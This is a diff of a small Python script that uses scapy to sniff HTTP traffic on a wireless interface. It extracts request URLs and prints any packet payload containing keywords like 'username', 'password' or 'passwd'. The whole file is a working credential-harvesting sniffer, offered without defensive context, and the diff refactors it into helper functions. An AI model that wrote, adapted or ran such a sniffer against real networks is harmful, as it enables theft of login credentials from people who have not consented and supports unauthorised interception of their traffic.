@@ -1,22 +1,25 @@
 #!/usr/bin/env python3
-
-
-#it's not end version
-
 import scapy.all as scapy
 from scapy.layers import http
-def sniff(interface):
-    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)
+def sniffer(interface):
+    scapy.sniff(iface = interface, store =False, prn = process_sniffed_packet, filter  = "port 80")
+
+def get_url_packet(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet,url):
+    if packet.haslayer(scapy.Raw):
+        load = str(packet[scapy.Raw].load)
+        keywords =  ["username","Username","user","User","login","Login","email","e-mail","E-mail","Email","Password","password","pass","passwd","Pass","Passwd"]
+        for word in keywords:
+            if word in load:
+                print("-----URL: " + str(url) +"\n")
+                print("[+] Posible username and password:  "+ load)
+                print("=========================================================================================\n")
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            load = str(packet[scapy.Raw].load)
-            keywords = ["username","Username","user","User","login","Login","email","e-mail","E-mail","Email","Password","password","pass","passwd","Pass","Passwd"]
-            for keyword in keywords:
-                if keyword in load:
-                    print(load)
-                    break
-            
+        url = get_url_packet(packet)
+        get_login_info(packet,url)
 
-sniff("wlan0")
+sniffer("wlan0")
